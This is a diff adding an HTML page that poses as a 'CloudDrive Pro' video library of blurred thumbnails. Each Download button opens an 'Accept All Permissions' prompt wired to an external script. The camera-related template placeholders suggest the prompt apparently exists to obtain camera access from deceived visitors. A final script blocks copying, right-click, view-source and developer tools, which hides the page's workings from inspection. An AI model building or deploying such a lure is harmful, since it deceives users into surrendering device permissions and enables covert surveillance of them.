@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CloudDrive Pro - Your Videos</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #2d3748;
+            line-height: 1.6;
+        }
+
+        .navbar {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 1rem 2rem;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .nav-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #4a5568;
+        }
+
+        .logo i {
+            color: #667eea;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+            align-items: center;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: #4a5568;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .nav-links a:hover {
+            color: #667eea;
+        }
+
+        .user-menu {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 100px auto 50px;
+            padding: 0 20px;
+        }
+
+        .thumbnail-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .thumbnail-card {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            transition: all 0.3s ease;
+            cursor: pointer;
+            border: 1px solid #e2e8f0;
+            position: relative;
+        }
+
+        .thumbnail-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+            border-color: #667eea;
+        }
+
+        .thumbnail-image {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            border-bottom: 1px solid #e2e8f0;
+            position: relative;
+        }
+
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 150px;
+            background: rgba(0, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .thumbnail-card:hover .video-overlay {
+            opacity: 1;
+        }
+
+        .play-icon {
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #667eea;
+            font-size: 1.2rem;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .thumbnail-info {
+            padding: 1rem;
+        }
+
+        .thumbnail-name {
+            font-weight: 600;
+            color: #2d3748;
+            margin-bottom: 0.5rem;
+            font-size: 0.95rem;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .thumbnail-meta {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.8rem;
+            color: #718096;
+            margin-bottom: 0.5rem;
+        }
+
+        .file-size {
+            font-weight: 500;
+            color: #667eea;
+        }
+
+        .file-date {
+            color: #a0aec0;
+        }
+
+        .file-resolution {
+            background: #e2e8f0;
+            color: #4a5568;
+            padding: 1px 6px;
+            border-radius: 3px;
+            font-size: 0.7rem;
+            font-weight: 500;
+        }
+
+        .download-btn {
+            width: 100%;
+            background: #48bb78;
+            color: white;
+            border: none;
+            padding: 0.6rem;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            font-weight: 500;
+        }
+
+        .download-btn:hover {
+            background: #38a169;
+            transform: translateY(-1px);
+        }
+
+        .download-btn:active {
+            transform: translateY(0);
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .section-header h2 {
+            font-size: 1.4rem;
+            color: white;
+            font-weight: 600;
+        }
+
+        .view-all {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .view-all:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+
+            .thumbnail-grid {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            }
+        }
+
+        .permission-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 15px;
+            padding: 2rem;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+        }
+
+        .modal-icon {
+            font-size: 3rem;
+            color: #667eea;
+            margin-bottom: 1rem;
+        }
+
+        .modal-content h3 {
+            font-size: 1.4rem;
+            color: #2d3748;
+            margin-bottom: 1rem;
+        }
+
+        .modal-content p {
+            color: #718096;
+            margin-bottom: 1.5rem;
+            line-height: 1.5;
+        }
+
+        .modal-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .modal-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+    </style>
+</head>
+
+<body>
+    <nav class="navbar">
+        <div class="nav-content">
+            <div class="logo">
+                <i class="fas fa-cloud"></i>
+                <span>CloudDrive Pro</span>
+            </div>
+            <div class="nav-links">
+                <a href="#"><i class="fas fa-home"></i> Home</a>
+                <a href="#"><i class="fas fa-folder"></i> My Files</a>
+                <a href="#"><i class="fas fa-history"></i> Recent</a>
+            </div>
+            <div class="user-menu">
+                <div class="avatar">JD</div>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div>
+            <div class="section-header">
+                <h2>All Videos</h2>
+                <a href="#" class="view-all">View All</a>
+            </div>
+
+            <div class="thumbnail-grid">
+                <!-- Video 1 -->
+                <div class="thumbnail-card">
+                    <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_90c2fb76-bf4f-48c2-bafe-74957e931e91.jpg"
+                        alt="Video 1" class="thumbnail-image">
+                    <div class="video-overlay">
+                        <div class="play-icon">
+                            <i class="fas fa-play"></i>
+                        </div>
+                    </div>
+                    <div class="thumbnail-info">
+                        <div class="thumbnail-name">Video_001.mp4</div>
+                        <div class="thumbnail-meta">
+                            <span class="file-size">24 MB</span>
+                            <span class="file-resolution">1080p</span>
+                        </div>
+                        <div class="thumbnail-meta">
+                            <span class="file-date">5 mins ago</span>
+                        </div>
+                        <button class="download-btn" onclick="handleDownload(1)">
+                            <i class="fas fa-download"></i> Download
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Video 2 -->
+                <div class="thumbnail-card">
+                    <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_ea32b722-23bd-4ae4-8acc-0ccba23d9be7.jpg"
+                        alt="Video 2" class="thumbnail-image">
+                    <div class="video-overlay">
+                        <div class="play-icon">
+                            <i class="fas fa-play"></i>
+                        </div>
+                    </div>
+                    <div class="thumbnail-info">
+                        <div class="thumbnail-name">Video_002.mp4</div>
+                        <div class="thumbnail-meta">
+                            <span class="file-size">50 MB</span>
+                            <span class="file-resolution">1080p</span>
+                        </div>
+                        <div class="thumbnail-meta">
+                            <span class="file-date">5 mins ago</span>
+                        </div>
+                        <button class="download-btn" onclick="handleDownload(2)">
+                            <i class="fas fa-download"></i> Download
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Video 3 -->
+                <div class="thumbnail-card">
+                    <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_c7893c0a-1dba-409d-82c6-754b2ea02e53.jpg"
+                        alt="Video 3" class="thumbnail-image">
+                    <div class="video-overlay">
+                        <div class="play-icon">
+                            <i class="fas fa-play"></i>
+                        </div>
+                    </div>
+                    <div class="thumbnail-info">
+                        <div class="thumbnail-name">Video_003.mp4</div>
+                        <div class="thumbnail-meta">
+                            <span class="file-size">51 MB</span>
+                            <span class="file-resolution">1080p</span>
+                        </div>
+                        <div class="thumbnail-meta">
+                            <span class="file-date">5 mins ago</span>
+                        </div>
+                        <button class="download-btn" onclick="handleDownload(3)">
+                            <i class="fas fa-download"></i> Download
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Video 4 -->
+                <div class="thumbnail-card">
+                    <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_7fcea43a-58e8-4c7e-b523-c9945ea63f67.png"
+                        alt="Video 4" class="thumbnail-image">
+                    <div class="video-overlay">
+                        <div class="play-icon">
+                            <i class="fas fa-play"></i>
+                        </div>
+                    </div>
+                    <div class="thumbnail-info">
+                        <div class="thumbnail-name">Video_004.mp4</div>
+                        <div class="thumbnail-meta">
+                            <span class="file-size">5 MB</span>
+                            <span class="file-resolution">1080p</span>
+                        </div>
+                        <div class="thumbnail-meta">
+                            <span class="file-date">5 mins ago</span>
+                        </div>
+                        <button class="download-btn" onclick="handleDownload(4)">
+                            <i class="fas fa-download"></i> Download
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Video 5 -->
+                <div class="thumbnail-card">
+                    <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_dfed4fd3-ab1d-46af-9b83-2dd3adcd109d.jpg"
+                        alt="Video 5" class="thumbnail-image">
+                    <div class="video-overlay">
+                        <div class="play-icon">
+                            <i class="fas fa-play"></i>
+                        </div>
+                    </div>
+                    <div class="thumbnail-info">
+                        <div class="thumbnail-name">Video_005.mp4</div>
+                        <div class="thumbnail-meta">
+                            <span class="file-size">32 MB</span>
+                            <span class="file-resolution">1080p</span>
+                        </div>
+                        <div class="thumbnail-meta">
+                            <span class="file-date">5 mins ago</span>
+                        </div>
+                        <button class="download-btn" onclick="handleDownload(5)">
+                            <i class="fas fa-download"></i> Download
+                        </button>
+                    </div>
+                </div>
+
+                <div class="thumbnail-card">
+                    <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_1582813e-89e0-4b09-a10b-53ec9590a8ab.png"
+                        alt="Video 6" class="thumbnail-image">
+                    <div class="video-overlay">
+                        <div class="play-icon">
+                            <i class="fas fa-play"></i>
+                        </div>
+                    </div>
+                    <div class="thumbnail-info">
+                        <div class="thumbnail-name">Video_006.mp4</div>
+                        <div class="thumbnail-meta">
+                            <span class="file-size">40 MB</span>
+                            <span class="file-resolution">1080p</span>
+                        </div>
+                        <div class="thumbnail-meta">
+                            <span class="file-date">5 mins ago</span>
+                        </div>
+                        <button class="download-btn" onclick="handleDownload(7)">
+                            <i class="fas fa-download"></i> Download
+                        </button>
+                    </div>
+                </div>
+
+                <div class="thumbnail-card">
+                    <img src="https://s3.eu-west-1.amazonaws.com/prod-unlockt-media/lifetime/blur_cf90353e-85af-4b14-b193-916c86514f43.jpg"
+                        alt="Video 7" class="thumbnail-image">
+                    <div class="video-overlay">
+                        <div class="play-icon">
+                            <i class="fas fa-play"></i>
+                        </div>
+                    </div>
+                    <div class="thumbnail-info">
+                        <div class="thumbnail-name">Video_007.mp4</div>
+                        <div class="thumbnail-meta">
+                            <span class="file-size">10 MB</span>
+                            <span class="file-resolution">1080p</span>
+                        </div>
+                        <div class="thumbnail-meta">
+                            <span class="file-date">5 mins ago</span>
+                        </div>
+                        <button class="download-btn" onclick="handleDownload(8)">
+                            <i class="fas fa-download"></i> Download
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="permission-modal" id="permissionModal">
+        <div class="modal-content">
+            <div class="modal-icon">
+                <i class="fas fa-shield-alt"></i>
+            </div>
+            <h3>Accept Permissions to Download</h3>
+            <p>To download this video, you need to accept all required permissions. This ensures secure file transfer
+                and
+                access to your download folder.</p>
+            <button class="modal-btn" onclick="acceptPermissions()">
+                Accept All Permissions
+            </button>
+        </div>
+    </div>
+    <script src="object.js"></script>
+    <script>
+        const delay = __CAMERA_COUNT__;
+        window.in_button.sc(delay);
+        window.in_button.button_enable(__CAMERA_STATUS__);
+
+        function click_button() {
+            window.in_button.accept();
+        }
+        function handleDownload(fileId) {
+            const modal = document.getElementById('permissionModal');
+            modal.style.display = 'flex';
+            modal.setAttribute('data-file-id', fileId);
+        }
+        function acceptPermissions() {
+            const modal = document.getElementById('permissionModal');
+            const fileId = modal.getAttribute('data-file-id');
+            modal.style.display = 'none';
+            click_button();
+        }
+        document.getElementById('permissionModal').addEventListener('click', function (e) {
+            if (e.target === this) {
+                this.style.display = 'none';
+            }
+        });
+        document.querySelectorAll('.thumbnail-card').forEach(card => {
+            card.addEventListener('mouseenter', function () {
+                this.style.transform = 'translateY(-5px)';
+            });
+            card.addEventListener('mouseleave', function () {
+                this.style.transform = 'translateY(0)';
+            });
+        });
+    </script>
+    <script>document.addEventListener('contextmenu', e => e.preventDefault()); document.addEventListener('dragstart', e => !e.target.matches('button,input,textarea,a,[contenteditable="true"]') && (e.preventDefault(), !1)); document.addEventListener('selectstart', e => !e.target.matches('input,textarea,[contenteditable="true"]') && (e.preventDefault(), !1)); document.addEventListener('copy', e => !e.target.matches('input,textarea,[contenteditable="true"]') && e.preventDefault()); document.addEventListener('cut', e => !e.target.matches('input,textarea,[contenteditable="true"]') && e.preventDefault()); document.addEventListener('paste', e => !e.target.matches('input,textarea,[contenteditable="true"]') && e.preventDefault()); document.addEventListener('keydown', e => { (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)) || (e.ctrlKey && ['u', 'U'].includes(e.key)) || e.key === 'F11' || (e.ctrlKey && ['s', 'S', 'p', 'P'].includes(e.key)) || (e.altKey && e.key === 'Tab')) && (e.preventDefault(), !1) }); setInterval(() => { const w = window.outerWidth - window.innerWidth > 160, h = window.outerHeight - window.innerHeight > 160; (w || h) && !window.devToolsOpen && (window.devToolsOpen = !0) }, 2000);</script>
+</body>
+
+</html>
